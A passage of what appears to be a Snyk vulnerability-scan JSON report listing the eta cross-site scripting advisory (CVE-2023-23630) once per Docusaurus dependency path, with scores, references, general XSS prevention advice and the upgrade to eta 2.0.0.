(usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [GitHub Release](https://github.com/eta-dev/eta/releases/tag/v2.0.0)\n",
      "epssDetails": {
        "percentile": "0.18312",
        "probability": "0.00052",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2023-23630"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-xrh7-m5pp-39r6"
        ]
      },
      "packageName": "eta",
      "proprietary": false,
      "creationTime": "2023-02-01T09:24:55.728670Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2023-01-31T22:39:40Z",
      "packageManager": "npm",
      "publicationTime": "2023-02-01T13:47:00.613727Z",
      "modificationTime": "2023-02-14T15:04:12.598888Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-common@2.3.1",
        "@docusaurus/plugin-content-blog@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-3261240",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Agustin Gianni"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/releases/tag/v2.0.0",
          "title": "GitHub Release"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2023-02-14T15:04:12.598888Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via `renderFile` function, due to improper user-input sanitization. \r\n\r\n## Workaround\r\n\r\nUsers who are unable to upgrade should not pass user supplied data directly to `res.renderFile`.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [GitHub Release](https://github.com/eta-dev/eta/releases/tag/v2.0.0)\n",
      "epssDetails": {
        "percentile": "0.18312",
        "probability": "0.00052",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2023-23630"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-xrh7-m5pp-39r6"
        ]
      },
      "packageName": "eta",
      "proprietary": false,
      "creationTime": "2023-02-01T09:24:55.728670Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2023-01-31T22:39:40Z",
      "packageManager": "npm",
      "publicationTime": "2023-02-01T13:47:00.613727Z",
      "modificationTime": "2023-02-14T15:04:12.598888Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-classic@2.3.1",
        "@docusaurus/plugin-content-blog@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-3261240",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Agustin Gianni"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/releases/tag/v2.0.0",
          "title": "GitHub Release"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2023-02-14T15:04:12.598888Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via `renderFile` function, due to improper user-input sanitization. \r\n\r\n## Workaround\r\n\r\nUsers who are unable to upgrade should not pass user supplied data directly to `res.renderFile`.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [GitHub Release](https://github.com/eta-dev/eta/releases/tag/v2.0.0)\n",
      "epssDetails": {
        "percentile": "0.18312",
        "probability": "0.00052",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2023-23630"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-xrh7-m5pp-39r6"
        ]
      },
      "packageName": "eta",
      "proprietary": false,
      "creationTime": "2023-02-01T09:24:55.728670Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2023-01-31T22:39:40Z",
      "packageManager": "npm",
      "publicationTime": "2023-02-01T13:47:00.613727Z",
      "modificationTime": "2023-02-14T15:04:12.598888Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-common@2.3.1",
        "@docusaurus/plugin-content-docs@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-3261240",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Agustin Gianni"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/releases/tag/v2.0.0",
          "title": "GitHub Release"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2023-02-14T15:04:12.598888Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via `renderFile` function, due to improper user-input sanitization. \r\n\r\n## Workaround\r\n\r\nUsers who are unable to upgrade should not pass user supplied data directly to `res.renderFile`.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [GitHub Release](https://github.com/eta-dev/eta/releases/tag/v2.0.0)\n",
      "epssDetails": {
        "percentile": "0.18312",
        "probability": "0.00052",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2023-23630"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-xrh7-m5pp-39r6"
        ]
      },
      "packageName": "eta",
      "proprietary": false,
      "creationTime": "2023-02-01T09:24:55.728670Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2023-01-31T22:39:40Z",
      "packageManager": "npm",
      "publicationTime": "2023-02-01T13:47:00.613727Z",
      "modificationTime": "2023-02-14T15:04:12.598888Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-classic@2.3.1",
        "@docusaurus/plugin-content-docs@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-3261240",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Agustin Gianni"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/releases/tag/v2.0.0",
          "title": "GitHub Release"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2023-02-14T15:04:12.598888Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via `renderFile` function, due to improper user-input sanitization. \r\n\r\n## Workaround\r\n\r\nUsers who are unable to upgrade should not pass user supplied data directly to `res.renderFile`.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [GitHub Release](https://github.com/eta-dev/eta/releases/tag/v2.0.0)\n",
      "epssDetails": {
        "percentile": "0.18312",
        "probability": "0.00052",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2023-23630"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-xrh7-m5pp-39r6"
        ]
      },
      "packageName": "eta",
      "proprietary": false,
      "creationTime": "2023-02-01T09:24:55.728670Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2023-01-31T22:39:40Z",
      "packageManager": "npm",
      "publicationTime": "2023-02-01T13:47:00.613727Z",
      "modificationTime": "2023-02-14T15:04:12.598888Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-search-algolia@2.3.1",
        "@docusaurus/plugin-content-docs@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-3261240",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Agustin Gianni"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/releases/tag/v2.0.0",
          "title": "GitHub Release"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2023-02-14T15:04:12.598888Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via `renderFile` function, due to improper user-input sanitization. \r\n\r\n## Workaround\r\n\r\nUsers who are unable to upgrade should not pass user supplied data directly to `res.renderFile`.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [GitHub Release](https://github.com/eta-dev/eta/releases/tag/v2.0.0)\n",
      "epssDetails": {
        "percentile": "0.18312",
        "probability": "0.00052",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2023-23630"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-xrh7-m5pp-39r6"
        ]
      },
      "packageName": "eta",
      "proprietary": false,
      "creationTime": "2023-02-01T09:24:55.728670Z",
      "functions_new": [],
      "alternativeIds": [],
